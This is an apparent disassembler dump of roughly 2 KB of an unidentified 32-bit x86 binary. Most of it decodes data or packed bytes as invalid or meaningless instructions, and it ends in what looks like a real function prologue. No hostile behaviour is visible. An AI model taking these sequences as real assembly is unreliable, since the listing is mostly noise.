  4091fa:	imul   edi,DWORD PTR [ebx-0x65],0xc3b42573
  409201:	push   cs
  409202:	into   
  409203:	loopne 0x40920f
  409205:	pop    ecx
  409206:	jmp    0x12cb:0x45fa8dd2
  40920d:	repz ret 
  40920f:	call   0x84c17e2f
  409214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409215:	bound  ebp,QWORD PTR [esi-0xe7e9360]
  40921b:	ret    0x6855
  40921e:	imul   eax,DWORD PTR es:[edx*4-0x85f71ce],0x66959792
  40922a:	in     al,0xec
  40922c:	gs xchg ecx,eax
  40922e:	push   edi
  40922f:	sub    eax,0x1856099a
  409234:	push   DWORD PTR [esi-0xeaac388]
  40923a:	sbb    al,0xd1
  40923c:	shl    DWORD PTR fs:[edi+0x6b708d25],cl
  409243:	push   ebx
  409244:	ret    
  409245:	fimul  WORD PTR [edi-0x6fd61b04]
  40924b:	js     0x40923a
  40924d:	ret    
  40924e:	mov    edx,0x69a63931
  409253:	lahf   
  409254:	test   DWORD PTR [edi+0x1bc00e96],esi
  40925a:	retf   
  40925b:	test   DWORD PTR [ecx-0x3a65083c],esp
  409261:	test   DWORD PTR [esi+0x32df7081],ebp
  409267:	jo     0x4092da
  409269:	cmp    al,0x7c
  40926b:	push   ebx
  40926c:	cmp    BYTE PTR ds:0x39ee6fcc,dl
  409272:	mov    esi,0x23c5fc82
  409277:	ret    0xd991
  40927a:	sub    DWORD PTR [ebp+0x14b40e63],ecx
  409280:	inc    ebp
  409281:	call   0x996d43e5
  409286:	mov    eax,ds:0x14e99d8f
  40928b:	sub    BYTE PTR [ecx-0x6cc80ed5],cl
  409291:	mov    esp,0x4c75452d
  409296:	mov    ebp,esi
  409298:	lods   eax,DWORD PTR ds:[esi]
  409299:	daa    
  40929a:	mov    al,ds:0xba21cac6
  40929f:	cli    
  4092a0:	pop    esp
  4092a1:	cdq    
  4092a2:	mov    edi,0x1fc02b05
  4092a7:	dec    esp
  4092a8:	mov    ss:0x16326321,al
  4092ae:	sbb    DWORD PTR [ebx],esp
  4092b0:	mov    BYTE PTR [ecx+0x46550eca],bh
  4092b6:	cwde   
  4092b7:	(bad)  
  4092b8:	clc    
  4092b9:	or     al,0x8a
  4092bb:	rol    cl,0xf2
  4092be:	shl    esp,cl
  4092c0:	mov    edi,0x782f733e
  4092c5:	jb     0x409329
  4092c7:	xor    eax,esi
  4092c9:	cmp    BYTE PTR [ebx-0x477c7c29],bl
  4092cf:	sub    ebx,DWORD PTR [esi-0x641148a4]
  4092d5:	add    eax,0x66a9ac60
  4092da:	adc    al,0x3b
  4092dc:	rcr    BYTE PTR [ebx-0x1b],0x45
  4092e0:	outs   dx,BYTE PTR ds:[esi]
  4092e1:	repnz fbld TBYTE PTR [eax-0x73]
  4092e5:	lock fstp QWORD PTR [ecx-0x3a12a5fe]
  4092ec:	shl    BYTE PTR [esi-0x7],cl
  4092ef:	popa   
  4092f0:	jmp    FWORD PTR [ecx+0x37]
  4092f3:	adc    BYTE PTR [eax+0x62],ch
  4092f6:	mov    eax,0x54cd4f87
  4092fb:	dec    esi
  4092fc:	and    BYTE PTR [ebx+0x40],0x8d
  409300:	mov    edi,0x58d30ff
  409305:	pusha  
  409306:	mov    dl,0x41
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	(bad)
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409352
  40933a:	aaa    
  40933b:	pop    esi
  40933c:	push   esi
  40933d:	out    dx,eax
  40933e:	mov    ecx,0x5d12bdbd
  409343:	fwait
  409344:	mov    ebp,0xa6ef8439
  409349:	retf   
  40934a:	fiadd  WORD PTR [eax+0x5ee9b564]
  409350:	dec    BYTE PTR [edi+0x36607d64]
  409356:	xchg   edi,eax
  409357:	xrelease mov DWORD PTR [esi],ebp
  40935a:	push   ds
  40935b:	mov    eax,0x170a9b98
  409360:	fwait
  409361:	and    bh,BYTE PTR [esi]
  409363:	psrlw  mm4,QWORD PTR [esi+0x56]
  409367:	pop    ecx
  409368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409369:	and    BYTE PTR [ebx-0x40],bh
  40936c:	pop    ecx
  40936d:	cdq    
  40936e:	jmp    0x29806822
  409373:	jle    0x409356
  409375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409376:	pop    eax
  409377:	xchg   BYTE PTR ds:0x97c85c8a,bh
  40937d:	inc    esp
  40937e:	(bad)  
  40937f:	or     BYTE PTR es:[ebp-0x2e1ba329],bh
  409386:	(bad)  
  409387:	out    dx,al
  409388:	inc    esp
  409389:	maxps  xmm3,XMMWORD PTR [ebp+0x39e10157]
  409390:	add    ecx,DWORD PTR [ebx+0x51]
  409393:	dec    eax
  409394:	cmp    DWORD PTR [edx+0x1f],ecx
  409397:	pushf  
  409398:	and    eax,0x18e16397
  40939d:	add    BYTE PTR [esi+0x397bc170],ch
  4093a3:	jns    0x409384
  4093a5:	addr16 call 0x8a12:0x3cf7dd7f
  4093ad:	mov    gs,WORD PTR [esi+0xe]
  4093b0:	dec    esp
  4093b1:	lods   eax,DWORD PTR ds:[esi]
  4093b2:	and    al,0xa2
  4093b4:	dec    esi
  4093b5:	repz in eax,0x25
  4093b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093b9:	es mov bh,0x6f
  4093bc:	test   eax,0x3aecfeb0
  4093c1:	dec    edx
  4093c2:	sub    ch,BYTE PTR [eax-0x30]
  4093c5:	mov    DWORD PTR [ebp+0x53],esp
  4093c8:	xor    dh,BYTE PTR [esi-0xa]
  4093cb:	or     eax,0x39a21a5d
  4093d0:	sub    DWORD PTR [ebx-0x6581deb6],esp
  4093d6:	dec    esi
  4093d7:	sub    bh,bl
  4093d9:	pop    esp
  4093da:	inc    edx
  4093db:	push   ecx
  4093dc:	jle    0x40944d
  4093de:	cld    
  4093df:	iret   
  4093e0:	push   ss
  4093e1:	adc    eax,0x42eef3c9
  4093e6:	cld    
  4093e7:	xor    eax,0xd2f6717a
  4093ec:	fild   WORD PTR [ecx]
  4093ee:	jne    0x4093fe
  4093f0:	test   al,0xd8
  4093f2:	(bad)  
  4093f4:	cmp    eax,0xb7722074
  4093f9:	lahf   
  4093fa:	add    al,0x88
  4093fc:	inc    ebx
  4093fd:	lods   al,BYTE PTR ds:[esi]
  4093fe:	sub    DWORD PTR [esi-0x4e7a9e1a],esp
  409404:	sbb    edx,esi
  409406:	cli    
  409407:	xchg   edi,esi
  409409:	psrlq  mm7,QWORD PTR [edx]
  40940c:	out    dx,al
  40940d:	cmp    ecx,DWORD PTR [ebx+0x44601fc6]
  409413:	mov    ch,0xeb
  409415:	test   eax,0xd9e8540a
  40941a:	pusha  
  40941b:	dec    ebp
  40941c:	aam    0x9c
  40941e:	aaa    
  40941f:	pop    ebp
  409420:	jle    0x409447
  409422:	mov    al,ds:0x8b54cd2b
  409427:	dec    ebp
  409428:	enter  0xca2a,0x89
  40942c:	outs   dx,BYTE PTR ds:[esi]
  40942d:	daa    
  40942e:	or     eax,0x2f9dbc6b
  409433:	inc    eax
  409434:	sub    edx,ebp
  409436:	and    ecx,DWORD PTR [edx]
  409438:	sub    al,0x65
  40943a:	clc    
  40943b:	push   eax
  40943c:	jb     0x4093db
  40943e:	dec    edx
  40943f:	fcomi  st,st(4)
  409441:	fmul   DWORD PTR [edi+0x54]
  409444:	adc    BYTE PTR [edi+ecx*1-0x4e],al
  409448:	cmp    DWORD PTR [edi],ebx
  40944a:	or     al,0x9d
  40944c:	jb     0x409498
  40944e:	ins    DWORD PTR es:[edi],dx
  40944f:	add    BYTE PTR [ebp+0x21],0x3a
  409453:	xor    ecx,DWORD PTR [eax-0x1520c198]
  409459:	ja     0x409424
  40945b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40945c:	mov    esi,0x33cbe543
  409461:	test   DWORD PTR [edi-0x14493b23],esp
  409467:	push   edx
  409468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409469:	and    al,BYTE PTR [esi-0x3d21d81b]
  40946f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409470:	push   0xffffffb5
  409472:	sbb    al,0xae
  409474:	cs dec edx
  409476:	add    al,BYTE PTR [ebx]
  409478:	les    ebp,FWORD PTR [eax+0x7893d45f]
  40947e:	or     esp,DWORD PTR [ebx+0x734a1b1]
  409484:	adc    bh,bl
  409486:	dec    ebx
  409487:	and    DWORD PTR [eax-0x66cea802],edi
  40948d:	jbe    0x4094a8
  40948f:	cdq    
  409490:	inc    ecx
  409491:	jbe    0x409506
  409493:	icebp  
  409494:	inc    ecx
  409495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409496:	pop    edi
  409497:	jbe    0x409471
  409499:	mov    cs,WORD PTR [edx+ecx*4]
  40949c:	dec    esp
  40949d:	(bad)  
  40949e:	mov    ch,0xd3
  4094a0:	mov    ds:0xf739cf6b,eax
  4094a5:	in     eax,0xe5
  4094a7:	dec    ebx
  4094a8:	ins    BYTE PTR es:[edi],dx
  4094a9:	enter  0xf4cd,0x5
  4094ad:	xchg   edx,eax
  4094ae:	mov    ah,0xfc
  4094b0:	add    al,0x5e
  4094b2:	add    dh,BYTE PTR ds:[edi-0x20]
  4094b6:	mov    al,ds:0x6ffc7816
  4094bb:	and    DWORD PTR [esi-0x8],0xd2031de
  4094c2:	push   esp
  4094c3:	add    DWORD PTR [esi-0x12],ecx
  4094c6:	or     BYTE PTR [edi-0x44e8ba29],bh
  4094cc:	mov    eax,ds:0x7b1e3c08
  4094d1:	test   al,0xb8
  4094d3:	aam    0x67
  4094d5:	add    cl,BYTE PTR [ecx]
  4094d7:	jp     0x409522
  4094d9:	jbe    0x4094bd
  4094db:	cmp    bl,BYTE PTR [edx-0x1e]
  4094de:	sub    al,0x4
  4094e0:	repnz icebp 
  4094e2:	mov    eax,0xf2619350
  4094e7:	std    
  4094e8:	inc    esp
  4094e9:	mov    al,ds:0x36eb8e3a
  4094ee:	jbe    0x409559
  4094f0:	js     0x40953b
  4094f2:	add    eax,DWORD PTR [ebx]
  4094f4:	jbe    0x4094a9
  4094f6:	and    esi,DWORD PTR [ebx+0x29]
  4094f9:	jbe    0x40951b
  4094fb:	hlt    
  4094fc:	out    dx,al
  4094fd:	pop    eax
  4094fe:	pushf  
  4094ff:	dec    BYTE PTR [ebp+0x3974fcfc]
  409505:	ret    
  409506:	fisttp WORD PTR [ecx]
  409508:	test   al,0xa
  40950a:	add    ecx,eax
  40950c:	cmp    ah,ch
  40950e:	push   ebp
  40950f:	(bad)  
  409510:	jmp    0x40953f
  409512:	or     al,0xe8
  409514:	shl    BYTE PTR [ecx],1
  409516:	jle    0x4094ec
  409518:	ret    0x6627
  40951b:	inc    esi
  40951c:	add    DWORD PTR [ebp-0x4a5c8a22],eax
  409522:	mov    gs,WORD PTR [ecx]
  409524:	push   edi
  409525:	xor    dl,BYTE PTR [ebp-0x4f21aa2f]
  40952b:	test   BYTE PTR [eax+eiz*2],bh
  40952e:	mov    ebp,0x90581dbe
  409533:	in     al,0x81
  409535:	xor    al,0x91
  409537:	mov    eax,0x9c048cea
  40953c:	add    DWORD PTR [esi+0x19],ebx
  40953f:	push   ebp
  409540:	rcl    dl,cl
  409542:	movaps XMMWORD PTR [esi-0x4a],xmm2
  409546:	inc    esi
  409547:	pushf  
  409548:	sti    
  409549:	daa    
  40954a:	test   BYTE PTR [ebx],cl
  40954c:	sbb    DWORD PTR [ebp+0x51],esi
  40954f:	and    eax,DWORD PTR [ebx-0x2a]
  409552:	mov    dh,0x4d
  409554:	shl    edx,cl
  409556:	jmp    0x409557
  409558:	fcom   QWORD PTR [edx+0x13]
  40955b:	mov    ebx,ebp
  40955d:	sbb    eax,0x6118fc17
  409562:	pop    ebx
  409563:	ror    DWORD PTR [edi],0xa8
  409566:	jns    0x409541
  409568:	in     al,0x0
  40956a:	xor    BYTE PTR [edx],bl
  40956c:	or     DWORD PTR [ebx],esp
  40956e:	sahf   
  40956f:	sub    bl,dl
  409571:	sti    
  409572:	stos   BYTE PTR es:[edi],al
  409573:	mov    eax,ds:0x94a868fe
  409578:	loop   0x409527
  40957a:	imul   esp,DWORD PTR [edx],0x7e
  40957d:	mov    eax,ds:0x60d67ac7
  409582:	mov    esi,0x93923bed
  409587:	xor    edi,DWORD PTR [eax-0x1011790a]
  40958d:	jle    0x4095b8
  40958f:	xchg   edi,eax
  409590:	loop   0x40956d
  409592:	push   ss
  409593:	(bad)  
  409595:	inc    ebp
  409596:	std    
  409597:	lea    esp,[ecx+ecx*2-0x46bd5011]
  40959e:	jne    0x4095e4
  4095a0:	enter  0x69b0,0x8e
  4095a4:	sbb    al,0x1c
  4095a6:	adc    esi,0xd5b260b4
  4095ac:	mov    eax,0x773dfdd2
  4095b1:	xor    eax,0xc8f1719e
  4095b6:	scas   al,BYTE PTR es:[edi]
  4095b7:	js     0x4095dc
  4095b9:	loope  0x4095e8
  4095bb:	fimul  WORD PTR [edi+0x7ccb22af]
  4095c1:	test   eax,0x137eb02d
  4095c6:	(bad)  
  4095c7:	xchg   edi,eax
  4095c8:	add    BYTE PTR [esi-0x20b11430],ch
  4095ce:	jle    0x409627
  4095d0:	mov    al,ds:0xb5147c8f
  4095d5:	js     0x40955b
  4095d7:	jmp    0x141:0xbc7ba646
  4095de:	stc    
  4095df:	js     0x40963f
  4095e1:	ins    DWORD PTR es:[edi],dx
  4095e2:	fimul  WORD PTR [ebp+0x6e]
  4095e5:	stos   DWORD PTR es:[edi],eax
  4095e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e7:	cdq    
  4095e8:	xchg   esp,eax
  4095e9:	nop
  4095ea:	or     BYTE PTR [edi+0x17acc7af],cl
  4095f0:	sub    DWORD PTR [eax],ebx
  4095f2:	xor    al,al
  4095f4:	scas   eax,DWORD PTR es:[edi]
  4095f5:	pop    esp
  4095f6:	jns    0x409640
  4095f8:	jle    0x4095a9
  4095fa:	jne    0x409608
  4095fc:	xor    BYTE PTR [eax],bl
  4095fe:	pop    ebx
  4095ff:	imul   edi,DWORD PTR [ebx],0x951b46ae
  409605:	add    eax,0x92e9cfcd
  40960a:	mov    eax,0xc97f706f
  40960f:	retf   0x642c
  409612:	stos   BYTE PTR es:[edi],al
  409613:	and    ebp,edx
  409615:	add    DWORD PTR [ebx],eax
  409617:	inc    esp
  409618:	fidivr WORD PTR [ebx]
  40961a:	adc    esi,edx
  40961c:	or     DWORD PTR [esi],esp
  40961e:	push   ds
  40961f:	mov    edx,0xeb3a5f80
  409624:	call   0xf075:0x7cc5ae49
  40962b:	jecxz  0x409673
  40962d:	sbb    bl,cl
  40962f:	js     0x4095d8
  409631:	inc    ebp
  409632:	mov    ch,0xc6
  409634:	mov    esi,0x8ce1208
  409639:	inc    edx
  40963a:	or     BYTE PTR [ebp-0x7f],ah
  40963d:	jnp    0x4095ce
  40963f:	pop    es
  409640:	repnz add eax,0x8d13bf5c
  409646:	and    DWORD PTR [edx],esp
  409648:	and    ebp,DWORD PTR [ecx+0x3c]
  40964b:	ss iret 
  40964d:	lahf   
  40964e:	dec    ebp
  40964f:	arpl   WORD PTR [edx-0x30c0856e],bx
  409655:	dec    ebx
  409656:	add    bh,0x39
  409659:	xlat   BYTE PTR ds:[ebx]
  40965a:	push   es
  40965b:	div    WORD PTR [ebp+eax*8+0x70c536fc]
  409663:	inc    ecx
  409664:	in     eax,0x88
  409666:	cli    
  409667:	es or  al,0xff
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [edx-0x287479ab],esp
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096b3
  409693:	or     cl,cl
  409695:	xchg   edx,eax
  409696:	shr    BYTE PTR [edi+eax*8+0x13],1
  40969a:	iret   
  40969b:	ja     0x4096a1
  40969d:	push   es
  40969e:	(bad)  
  40969f:	sbb    esi,DWORD PTR [ecx+0x7c5c4f85]
  4096a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a6:	aas    
  4096a7:	add    ah,dl
  4096a9:	jl     0x40963a
  4096ab:	add    al,bl
  4096ad:	pop    ecx
  4096ae:	scas   eax,DWORD PTR es:[edi]
  4096af:	mov    WORD PTR [edx+0x6c],?
  4096b2:	(bad)  
  4096b3:	pop    ds
  4096b4:	inc    edi
  4096b5:	mov    ds:0xca842bb,al
  4096ba:	xor    al,0x2a
  4096bc:	fnstsw WORD PTR [edi+ecx*1]
  4096bf:	adc    eax,0x38849392
  4096c4:	rol    esp,cl
  4096c6:	mov    BYTE PTR [edi+ecx*8],ah
  4096c9:	out    dx,al
  4096ca:	xchg   ecx,eax
  4096cb:	adc    edx,DWORD PTR [esi-0x5e]
  4096ce:	and    dl,bl
  4096d0:	les    ecx,FWORD PTR [edx+0x1c]
  4096d3:	into   
  4096d4:	dec    ebx
  4096d5:	adc    DWORD PTR [edi],eax
  4096d7:	jo     0x40971a
  4096d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096da:	mov    esi,DWORD PTR [edx]
  4096dc:	ret    0xde7d
  4096df:	push   cs
  4096e0:	idiv   DWORD PTR [eax-0x4f]
  4096e3:	xchg   esi,eax
  4096e4:	pop    es
  4096e5:	jae    0x409694
  4096e7:	jmp    0xcf600a1d
  4096ec:	in     eax,0xdc
  4096ee:	bound  esi,QWORD PTR [eax]
  4096f0:	inc    ebx
  4096f1:	add    DWORD PTR [eax+0x7d],ebx
  4096f4:	xor    al,0x28
  4096f6:	pop    esi
  4096f7:	cmp    dh,BYTE PTR [edx]
  4096f9:	out    dx,eax
  4096fa:	shr    DWORD PTR [edi-0x7cb3e728],cl
  409700:	sub    ah,BYTE PTR [eax+eiz*8-0x21]
  409704:	rcr    BYTE PTR [edi],cl
  409706:	sbb    eax,0x4982d432
  40970b:	lods   al,BYTE PTR ds:[esi]
  40970c:	mov    cs,WORD PTR [eax]
  40970e:	arpl   WORD PTR [esi-0x49b90188],bx
  409714:	cmp    DWORD PTR [esi-0x80],0x65
  409718:	push   es
  409719:	lods   eax,DWORD PTR ds:[esi]
  40971a:	hlt    
  40971b:	jecxz  0x409775
  40971d:	push   esp
  40971e:	ds loop 0x409747
  409721:	das    
  409722:	push   esi
  409723:	lahf   
  409724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409725:	pop    eax
  409726:	call   0xa70384c1
  40972b:	xchg   edi,eax
  40972c:	stos   DWORD PTR es:[edi],eax
  40972d:	jnp    0x4096d2
  40972f:	call   0xc35041ac
  409734:	out    0x73,eax
  409736:	sbb    eax,0xc6c47cf7
  40973b:	add    eax,0x310b0126
  409740:	dec    ebp
  409741:	xchg   esi,eax
  409742:	add    cl,BYTE PTR [ebx+0x26]
  409745:	mov    WORD PTR [edx-0x51],gs
  409748:	gs lahf 
  40974a:	mov    al,0xcd
  40974c:	mov    dh,0x4d
  40974e:	outs   dx,BYTE PTR ds:[esi]
  40974f:	push   edi
  409750:	mov    dl,0x6a
  409752:	shl    DWORD PTR ds:0x892a402c,1
  409758:	fld    QWORD PTR [ecx]
  40975a:	sub    cl,BYTE PTR [ebx]
  40975c:	outs   dx,DWORD PTR ds:[esi]
  40975d:	push   eax
  40975e:	dec    DWORD PTR [esi]
  409760:	cmp    eax,DWORD PTR [esi]
  409762:	pop    eax
  409763:	loopne 0x409785
  409765:	aas    
  409766:	jo     0x409797
  409768:	cmc    
  409769:	mov    ebp,0x771aa94b
  40976e:	mov    esi,0xb94643c2
  409774:	sbb    edx,DWORD PTR [ecx]
  409776:	cmp    al,0xa9
  409778:	jbe    0x40970f
  40977a:	scas   al,BYTE PTR es:[edi]
  40977b:	inc    ebp
  40977c:	adc    eax,0x3eb502b
  409781:	or     DWORD PTR [edi],edi
  409783:	aaa    
  409784:	inc    edi
  409785:	mov    al,ds:0x4b441ae
  40978a:	ret    
  40978b:	mov    ch,0xe2
  40978d:	xor    cl,BYTE PTR [ebp-0xa]
  409790:	or     eax,0xf6865ddd
  409795:	ror    BYTE PTR [eax],1
  409797:	cmp    al,0x58
  409799:	pop    ecx
  40979a:	pop    esi
  40979b:	enter  0x4ccf,0x2
  40979f:	in     al,0xec
  4097a1:	popa   
  4097a2:	lods   al,BYTE PTR ds:[esi]
  4097a3:	test   ebp,0x5a6962b2
  4097a9:	icebp  
  4097aa:	dec    ebp
  4097ab:	lahf   
  4097ac:	arpl   WORD PTR [edi+edi*1],sp
  4097af:	ud0    ecx,DWORD PTR [ebp-0x3b36876f]
  4097b6:	push   0x1d439261
  4097bb:	mov    al,ds:0x1aa4c063
  4097c0:	mov    ebp,0x431864f
  4097c5:	and    edx,esp
  4097c7:	inc    edi
  4097c8:	das    
  4097c9:	or     DWORD PTR [edi-0x624e9a56],esi
  4097cf:	(bad)  
  4097d0:	mul    BYTE PTR [esi-0x56]
  4097d3:	push   esp
  4097d4:	aad    0x45
  4097d6:	enter  0x21ee,0xc3
  4097da:	(bad)  
  4097db:	jle    0x409775
  4097dd:	icebp  
  4097de:	mov    ah,0x70
  4097e0:	outs   dx,BYTE PTR ds:[esi]
  4097e1:	cld    
  4097e2:	mov    WORD PTR [edx+0x1f],ds
  4097e5:	(bad)  
  4097e6:	xchg   edx,eax
  4097e7:	mov    ds:0x554556ca,eax
  4097ec:	cmp    al,0xfa
  4097ee:	ins    DWORD PTR es:[edi],dx
  4097ef:	test   bh,cl
  4097f1:	shr    BYTE PTR [ecx+ecx*2-0x6978a80e],cl
  4097f8:	loop   0x409841
  4097fa:	sbb    dh,ah
  4097fc:	sbb    eax,0xc075e7a2
  409801:	cli    
  409802:	(bad)  
  409803:	stos   BYTE PTR es:[edi],al
  409804:	push   ebx
  409805:	push   esi
  409806:	rol    BYTE PTR [edi-0x2a06394f],1
  40980c:	and    BYTE PTR [ebx],ch
  40980e:	mov    ds:0xc0b8500d,al
  409813:	lock lea ebp,[ecx+0x48]
  409817:	jmp    0x23c7:0x41b6d84c
  40981e:	into   
  40981f:	call   0xac10:0xd0b660b6
  409826:	daa    
  409827:	xor    al,0xcf
  409829:	repz mov ebx,DWORD PTR [eax]
  40982c:	cmp    al,0xfc
  40982e:	popa   
  40982f:	mov    ebx,0xe6d9166a
  409834:	test   al,0xb
  409836:	pop    ss
  409837:	sub    eax,0x54584e38
  40983c:	hlt    
  40983d:	jne    0x4098af
  40983f:	out    0x76,al
  409841:	xchg   esp,eax
  409842:	loope  0x40981a
  409844:	xlat   BYTE PTR ds:[ebx]
  409845:	pop    esp
  409846:	inc    esi
  409847:	jns    0x409837
  409849:	scas   eax,DWORD PTR es:[edi]
  40984a:	push   cs
  40984b:	inc    ebx
  40984c:	cmp    DWORD PTR [ebx+0xd3078e1],ebp
  409852:	leave  
  409853:	xor    ecx,DWORD PTR [ebp+0x2b6dd2ad]
  409859:	sar    DWORD PTR [eax+0x67],0x33
  40985d:	adc    edx,esp
  40985f:	aas    
  409860:	lea    esp,[ebx]
  409862:	dec    ecx
  409863:	pop    esp
  409864:	or     eax,0xf7d4b477
  409869:	push   ecx
  40986a:	mov    esp,0x34221b3d
  40986f:	test   al,0x4b
  409871:	inc    esp
  409872:	push   ds
  409873:	mov    eax,0x9bafc4e0
  409878:	fwait
  409879:	nop
  40987a:	inc    edi
  40987b:	hlt    
  40987c:	jg     0x4098ef
  40987e:	pop    ebx
  40987f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409880:	dec    eax
  409881:	mov    dl,0xc3
  409883:	sub    DWORD PTR [ebx-0x65],edx
  409886:	cmp    dl,BYTE PTR [ecx+0x26ae081d]
  40988c:	and    BYTE PTR [edi+0x1e],al
  40988f:	sub    DWORD PTR [edi-0x322ab59e],esi
  409895:	fisubr DWORD PTR [esp+eiz*8-0x1eae16d9]
  40989c:	jns    0x4098de
  40989e:	mov    al,BYTE PTR [edx-0x13cc021b]
  4098a4:	inc    esp
  4098a5:	pop    ebx
  4098a6:	sub    DWORD PTR [esi],esi
  4098a8:	aas    
  4098a9:	mov    eax,ds:0x474010a6
  4098ae:	into   
  4098af:	sub    DWORD PTR [edi-0x19],0xc5f35c60
  4098b6:	ja     0x4098cd
  4098b8:	je     0x4098f8
  4098ba:	dec    eax
  4098bb:	sti    
  4098bc:	add    DWORD PTR [ecx-0x59b7bd7b],esp
  4098c2:	add    DWORD PTR [eax-0x8d7f5ec],esi
  4098c8:	xchg   ecx,eax
  4098c9:	scas   eax,DWORD PTR es:[edi]
  4098ca:	push   0xb2a97995
  4098cf:	or     cl,BYTE PTR [eax+0x41]
  4098d2:	cmp    esi,DWORD PTR [ecx-0x47]
  4098d5:	stc    
  4098d6:	dec    edx
  4098d7:	sbb    esi,DWORD PTR [ecx+edi*4]
  4098da:	je     0x4098bd
  4098dc:	ret    0xb3bd
  4098df:	test   ch,ch
  4098e1:	mov    WORD PTR [edi],?
  4098e3:	daa    
  4098e4:	xchg   ebp,eax
  4098e5:	lods   al,BYTE PTR ds:[esi]
  4098e6:	retf   
  4098e7:	outs   dx,DWORD PTR ds:[esi]
  4098e8:	mov    al,ds:0xbb66751b
  4098ed:	jne    0x409883
  4098ef:	push   edx
  4098f0:	dec    eax
  4098f1:	enter  0x65fa,0x4d
  4098f5:	sbb    BYTE PTR [edi-0x4a],ch
  4098f8:	and    DWORD PTR [ebx],ebx
  4098fa:	inc    eax
  4098fb:	out    dx,eax
  4098fc:	fist   WORD PTR [edx+ecx*4]
  4098ff:	add    bl,ch
  409901:	or     esi,DWORD PTR [edi+0x6cf216c1]
  409907:	(bad)  
  409908:	or     DWORD PTR [ebx+edx*8],eax
  40990b:	inc    edx
  40990c:	xor    al,0xac
  40990e:	jmp    0x69ed:0xb1627cf3
  409915:	sub    ebp,DWORD PTR [ebx+esi*2-0x6af03ed7]
  40991c:	add    eax,0xbd9232a0
  409921:	test   DWORD PTR [ebx+eax*8-0x35],0x725d4fec
  409929:	sub    BYTE PTR [edi-0x64cb0dad],dh
  40992f:	mov    bh,0x90
  409931:	fnstenv ds:0xbca481c0
  409937:	(bad)  
  409938:	mov    ah,0xb9
  40993a:	jmp    0x4099a2
  40993c:	push   esp
  40993d:	pop    edi
  40993e:	inc    ebp
  40993f:	sub    al,0x9d
  409941:	mov    ebp,esp
  409943:	xor    eax,DWORD PTR [eax+0x648694fe]
  409949:	mov    eax,es
  40994b:	leave  
  40994c:	cmp    edi,ebx
  40994e:	push   0x471b8789
  409953:	sub    BYTE PTR [esi+0x41],ch
  409956:	cld    
  409957:	mov    eax,DWORD PTR [eax-0xf8640c8]
  40995d:	stos   BYTE PTR es:[edi],al
  40995e:	cmp    DWORD PTR ds:0x2d4010b9,eax
  409964:	pop    esp
  409965:	cli    
  409966:	pop    edi
  409967:	stos   BYTE PTR es:[edi],al
  409968:	pop    ecx
  409969:	sbb    al,BYTE PTR [ebx+0xbc160c8]
  40996f:	mov    ds,WORD PTR [ebx+0x66]
  409972:	frstor [eax+0x5e394ae4]
  409978:	js     0x4099cc
  40997a:	das    
  40997b:	pop    ebx
  40997c:	lahf   
  40997d:	ror    DWORD PTR [edx-0x157f7bd4],1
  409983:	push   ss
  409984:	imul   esp,DWORD PTR [edi+0x279d2b6c],0xffffffe7
  40998b:	xor    ebx,DWORD PTR ds:[ecx+0x72]
  40998f:	xor    eax,0x72ebd8bd
  409994:	cmp    DWORD PTR [eax-0x1a8fcfc7],esp
  40999a:	ds inc edi
  40999c:	xchg   ecx,eax
  40999d:	sti    
  40999e:	in     al,0xcc
  4099a0:	push   cs
  4099a1:	mov    ah,0x1b
  4099a3:	or     esp,esi
  4099a5:	dec    eax
  4099a6:	adc    ebp,eax
  4099a8:	add    bh,BYTE PTR [eax+0x46abafc6]
  4099ae:	mov    DWORD PTR [edx+eiz*4-0x4a19ef68],edi
  4099b5:	popf   
  4099b6:	outs   dx,BYTE PTR ds:[esi]
  4099b7:	repnz push edi
  4099b9:	adc    al,dh
  4099bb:	lock mov WORD PTR [eax-0x3718f67],?
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
